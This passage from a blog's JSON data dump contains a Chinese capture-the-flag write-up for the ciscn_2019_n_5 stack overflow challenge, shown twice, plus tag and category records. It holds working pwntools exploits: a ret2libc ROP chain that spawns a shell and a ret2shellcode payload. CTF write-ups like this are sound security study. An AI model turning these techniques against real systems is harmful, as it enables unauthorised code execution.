class=\"hljs-string\">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span> * <span class=\"hljs-number\">40</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.sendlineafter(<span class=\"hljs-string\">b&quot;What do you want to say to me?\\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n\n\n<p><strong>ret2shellcode</strong></p>\n<p><img src=\"/img/ciscn_2019_n_5/4.jpg\"></p>\n<p>由于题目给了bss段上100个字节的空间，可以用来写shellcode</p>\n<p>需要在注意的包括context.arch设置平台环境</p>\n<p>而且特意看了一下 <code>len(shellcode) </code>是 48 &lt; 100字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">27829</span>)<br><br>context.arch = <span class=\"hljs-string\">&#x27;amd64&#x27;</span><br>context.log_level = <span class=\"hljs-string\">&#x27;debug&#x27;</span><br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class=\"hljs-number\">0x0601080</span><br>p.sendlineafter(<span class=\"hljs-string\">&quot;tell me your name\\n&quot;</span>,shellcode)<br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span> * (<span class=\"hljs-number\">0x20</span> + <span class=\"hljs-number\">0x8</span>) + p64(name_addr)<br>p.sendlineafter(<span class=\"hljs-string\">b&quot;What do you want to say to me?\\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p>&lt;<a href=\"https://buuoj.cn/challenges#ciscn_2019_n_5\">https://buuoj.cn/challenges#ciscn_2019_n_5</a></p>\n<p><img src=\"/img/ciscn_2019_n_5/1.jpg\"></p>\n<p>依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）</p>\n<p>由于rop写习惯了，先列出rop的做法</p>\n<p><img src=\"/img/ciscn_2019_n_5/2.jpg\"></p>\n<p>第一个输入随便写，第二个输入开始溢出</p>\n<p><img src=\"/img/ciscn_2019_n_5/3.jpg\"></p>\n<p>溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址</p>\n<p>值得注意的是返回main后第二遍溢出时需要栈对齐</p>\n<p><strong>Exp1</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">27829</span>)<br><br>e = ELF(<span class=\"hljs-string\">&quot;./ciscn_2019_n_5&quot;</span>)<br><br>main = e.symbols[<span class=\"hljs-string\">&quot;main&quot;</span>]<br>puts_got = e.got[<span class=\"hljs-string\">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class=\"hljs-string\">&quot;puts&quot;</span>]<br><br>pop_rdi = <span class=\"hljs-number\">0x400713</span><br>ret = <span class=\"hljs-number\">0x4004c9</span><br><br>p.recvline()<br>p.sendline(<span class=\"hljs-string\">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span> * <span class=\"hljs-number\">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendlineafter(<span class=\"hljs-string\">b&quot;What do you want to say to me?\\n&quot;</span>, payload)<br><br>puts_addr =  u64(p.recvuntil(<span class=\"hljs-string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"hljs-number\">6</span>:].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class=\"hljs-string\">&#x27;puts&#x27;</span>, puts_addr)<br>offset = puts_addr - libc.dump(<span class=\"hljs-string\">&#x27;puts&#x27;</span>)<br>system = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br>binsh = offset + libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>)<br><br>p.recvline()<br>p.sendline(<span class=\"hljs-string\">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span> * <span class=\"hljs-number\">40</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.sendlineafter(<span class=\"hljs-string\">b&quot;What do you want to say to me?\\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n\n\n<p><strong>ret2shellcode</strong></p>\n<p><img src=\"/img/ciscn_2019_n_5/4.jpg\"></p>\n<p>由于题目给了bss段上100个字节的空间，可以用来写shellcode</p>\n<p>需要在注意的包括context.arch设置平台环境</p>\n<p>而且特意看了一下 <code>len(shellcode) </code>是 48 &lt; 100字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">27829</span>)<br><br>context.arch = <span class=\"hljs-string\">&#x27;amd64&#x27;</span><br>context.log_level = <span class=\"hljs-string\">&#x27;debug&#x27;</span><br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class=\"hljs-number\">0x0601080</span><br>p.sendlineafter(<span class=\"hljs-string\">&quot;tell me your name\\n&quot;</span>,shellcode)<br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span> * (<span class=\"hljs-number\">0x20</span> + <span class=\"hljs-number\">0x8</span>) + p64(name_addr)<br>p.sendlineafter(<span class=\"hljs-string\">b&quot;What do you want to say to me?\\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clc0969gg000678ufas666ie1","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969gm000e78uf0wufbbga"},{"post_id":"clc0969g5000078uf2cc5as9m","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969gn000i78uf99ae76g4"},{"post_id":"clc0969gi000878uf8dyc5wrx","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969go000l78ufdczt5gae"},{"post_id":"clc0969gk000b78uf0u5i118q","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969go000o78uf62ym50gc"},{"post_id":"clc0969ga000178ufhstk3oeu","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969gp000r78uf7zwb439c"},{"post_id":"clc0969gl000d78uffd3h7wpi","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969gt000v78uf0ml45sm1"},{"post_id":"clc0969gm000h78uf2o6h7e5p","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969gu000y78uf44c40pac"},{"post_id":"clc0969gf000478uf766seta9","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969gv001278uf7znsd2fk"},{"post_id":"clc0969gn000k78ufeden3hj1","category_id":"clc0969gd000278uf7pep918u","_id":"clc0969gw001478uf84w4bubh"},{"post_id":"clc0969go000n78uf00t9dixg","category_id":"clc0969gq000s78ufgvl5gryp","_id":"clc0969gw001678uf5f9qalvi"},{"post_id":"clc0969gv001078uf3j4r25px","category_id":"clc09kj890000voufb2vid6u7","_id":"clc09kj8i0002vouf2tev6dpm"},{"post_id":"clc0969gs000u78ufcqeg9qc6","category_id":"clc09kj890000voufb2vid6u7","_id":"clc09kj8i0003vouf0zjj3dms"},{"post_id":"clc0969gu000x78uf8xbmdatn","category_id":"clc09kj890000voufb2vid6u7","_id":"clceua2ou0003h4uffvwu9e9g"},{"post_id":"clceua2oi0000h4uf6sx33r9b","category_id":"clceua2op0001h4ufhgc2ctbi","_id":"clceua2ou0004h4uf7ccg39h2"},{"post_id":"clf7vmaze0000isuff5n56ile","category_id":"clceua2op0001h4ufhgc2ctbi","_id":"clf7vmazr0003isuf3e6kd590"},{"post_id":"clf7vmazp0002isuff0ov4j50","category_id":"clc0969gq000s78ufgvl5gryp","_id":"clf7vmazt0007isuf5boj6r7x"},{"post_id":"clf817ky00000nwuf9bn0ezlf","category_id":"clc0969gd000278uf7pep918u","_id":"clf817kya0003nwuffx3w64z4"},{"post_id":"clgq0i4r20000r8uf7v8ihsj9","category_id":"clc0969gd000278uf7pep918u","_id":"clgq0i4r90004r8uffplg3m3g"},{"post_id":"clgq0i4r80002r8ufba590arf","category_id":"clgq0i4ra0005r8uf726143dx","_id":"clgq0i4rj0008r8uffnf65xmn"},{"post_id":"clguc4twr0000skuf4i013kuw","category_id":"clc0969gd000278uf7pep918u","_id":"clguc4twz0005skufe38u02wa"},{"post_id":"clguc4twx0001skuf4xmxejam","category_id":"clc0969gd000278uf7pep918u","_id":"clguc4tx00007skufewzp10vm"},{"post_id":"clguc4twy0003skuf5hfy76uc","category_id":"clc0969gd000278uf7pep918u","_id":"clguc4tx00009skufcp2b65dm"},{"post_id":"clh5rzm970000zcuf891ifgzr","category_id":"clh5rzm9j0001zcufcn0bbi68","_id":"clh5rzm9v0004zcufbxqsd8hj"},{"post_id":"clhizl22700008oufhl3ybqnn","category_id":"clc0969gq000s78ufgvl5gryp","_id":"clhizl22e00028ouf5u98cfku"},{"post_id":"clllwuj8t0000qgufay6l9pvl","category_id":"clc0969gq000s78ufgvl5gryp","_id":"clllwuj920002qgufbb8pguzd"},{"post_id":"cllmdikge0000agufdo46co58","category_id":"clc0969gd000278uf7pep918u","_id":"cllmdikgm0003aguf1gd2b94w"}],"PostTag":[{"post_id":"clc0969g5000078uf2cc5as9m","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gf000378ufd9895yts"},{"post_id":"clc0969g5000078uf2cc5as9m","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clc0969gg000578ufhiaj8ro4"},{"post_id":"clc0969ga000178ufhstk3oeu","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gg000778uf74g4g80o"},{"post_id":"clc0969ga000178ufhstk3oeu","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clc0969gj000a78uf8uw3e6ta"},{"post_id":"clc0969gf000478uf766seta9","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gl000c78uf5btp9jic"},{"post_id":"clc0969gf000478uf766seta9","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clc0969gm000g78uf7k96b2ct"},{"post_id":"clc0969gg000678ufas666ie1","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gn000j78ufd4o12j1i"},{"post_id":"clc0969gg000678ufas666ie1","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clc0969go000m78ufexac3hxf"},{"post_id":"clc0969gi000878uf8dyc5wrx","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gp000p78ufes0p3spt"},{"post_id":"clc0969gk000b78uf0u5i118q","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gs000t78uf0h3mb1qh"},{"post_id":"clc0969gl000d78uffd3h7wpi","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gt000w78uf5obqerhc"},{"post_id":"clc0969gm000h78uf2o6h7e5p","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gu000z78uf23y9513j"},{"post_id":"clc0969gn000k78ufeden3hj1","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gv001378ufgpd3ca8n"},{"post_id":"clc0969gn000k78ufeden3hj1","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clc0969gw001578uf4y5kc83j"},{"post_id":"clc0969go000n78uf00t9dixg","tag_id":"clbrexdba0001swuf4hff1468","_id":"clc0969gw001778ufa78l2pgg"},{"post_id":"clc0969gs000u78ufcqeg9qc6","tag_id":"clajrmeg7000gkguf2rjy96mb","_id":"clc0969gw001a78ufbnhf0iks"},{"post_id":"clc0969gu000x78uf8xbmdatn","tag_id":"clbj1z92o0001tcufblyr1h5r","_id":"clc0969gw001b78ufge7r6jjv"},{"post_id":"clc0969gu000x78uf8xbmdatn","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clc0969gw001c78uf6nyrh29c"},{"post_id":"clc0969gu000x78uf8xbmdatn","tag_id":"clbrexdbd0002swuf8c9phc0m","_id":"clc0969gw001d78uf92hl7ydu"},{"post_id":"clc0969gu000x78uf8xbmdatn","tag_id":"clbrexdbe0004swuf95vs8891","_id":"clc0969gx001e78uf30gi3gbw"},{"post_id":"clc0969gv001078uf3j4r25px","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clc0969gx001f78uf0qs06t8h"},{"post_id":"clc0969gv001078uf3j4r25px","tag_id":"clajrmeg7000gkguf2rjy96mb","_id":"clc0969gx001g78uffq3x08g9"},{"post_id":"clf7vmazp0002isuff0ov4j50","tag_id":"clbrexdba0001swuf4hff1468","_id":"clf7vmazr0004isufare4am75"},{"post_id":"clf7vmaze0000isuff5n56ile","tag_id":"clf7vmazm0001isuf92ybb7fd","_id":"clf7vmazt0006isuf7mp57ibs"},{"post_id":"clceua2oi0000h4uf6sx33r9b","tag_id":"clf7vmazm0001isuf92ybb7fd","_id":"clf7vmazu0008isufcpb4aoge"},{"post_id":"clf817ky00000nwuf9bn0ezlf","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clf817ky60001nwuf1my4dz76"},{"post_id":"clgq0i4r20000r8uf7v8ihsj9","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clgq0i4r80001r8ufaums4qal"},{"post_id":"clgq0i4r20000r8uf7v8ihsj9","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clgq0i4r90003r8uf5uerf4v7"},{"post_id":"clgq0i4r80002r8ufba590arf","tag_id":"clgq0i4rh0006r8uf76mshqya","_id":"clgq0i4rj0009r8uf5r22eyll"},{"post_id":"clgq0i4r80002r8ufba590arf","tag_id":"clgq0i4ri0007r8uf3ynzcknk","_id":"clgq0i4rj000ar8uf8vu89r2q"},{"post_id":"clguc4twr0000skuf4i013kuw","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clguc4twy0002skufdq4535gd"},{"post_id":"clguc4twr0000skuf4i013kuw","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clguc4twz0004skuf8lhxd59g"},{"post_id":"clguc4twx0001skuf4xmxejam","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clguc4tx00006skufgz6vh8u5"},{"post_id":"clguc4twx0001skuf4xmxejam","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clguc4tx00008skuf8cdtf2kz"},{"post_id":"clguc4twy0003skuf5hfy76uc","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clguc4tx0000askufflexhksa"},{"post_id":"clguc4twy0003skuf5hfy76uc","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clguc4tx0000bskufeb7a5i9b"},{"post_id":"clh5rzm970000zcuf891ifgzr","tag_id":"clh5rzm9s0002zcufaevkd50i","_id":"clh5rzm9v0005zcuf5yi0gy10"},{"post_id":"clh5rzm970000zcuf891ifgzr","tag_id":"clh5rzm9u0003zcuffj6t5p5b","_id":"clh5rzm9w0006zcuf3exedpkf"},{"post_id":"clhizl22700008oufhl3ybqnn","tag_id":"clbrexdba0001swuf4hff1468","_id":"clhizl22e00018oufbqg1djp5"},{"post_id":"clllwuj8t0000qgufay6l9pvl","tag_id":"clbrexdba0001swuf4hff1468","_id":"clllwuj910001qgufc7r654kq"},{"post_id":"cllmdikge0000agufdo46co58","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"cllmdikgm0001aguf5f360cft"},{"post_id":"cllmdikge0000agufdo46co58","tag_id":"clajrmeg30006kgufebifbwhd","_id":"cllmdikgm0002aguf45qm85ih"}],"Tag":[{"name":"ctf-pwn","_id":"clajrmeg10003kguf8oyz8je2"},{"name":"exp","_id":"clajrmeg30006kgufebifbwhd"},{"name":"Others","_id":"clajrmeg7000gkguf2rjy96mb"},{"name":"datacon","_id":"clbj1z92o0001tcufblyr1h5r"},{"name":"iot-sec，powershell","_id":"clbj1z92t0002tcuf1ypg0a36"},{"name":"firmware analysis","_id":"clbrexdba0001swuf4hff1468"},{"name":"iot-sec","_id":"clbrexdbd0002swuf8c9phc0m"},{"name":"powershell","_id":"clbrexdbe0004swuf95vs8891"},{"name":"assembly","_id":"clf7vmazm0001isuf92ybb7fd"},{"name":"fuzz","_id":"clgq0i4rh0006r8uf76mshqya"},{"name":"afl","_id":"clgq0i4ri0007r8uf3ynzcknk"},{"name":"驱动开发","_id":"clh5rzm9s0002zcufaevkd50i"},{"name":"kernel漏洞","_id":"clh5rzm9u0003zcuffj6t5p5b"}]}}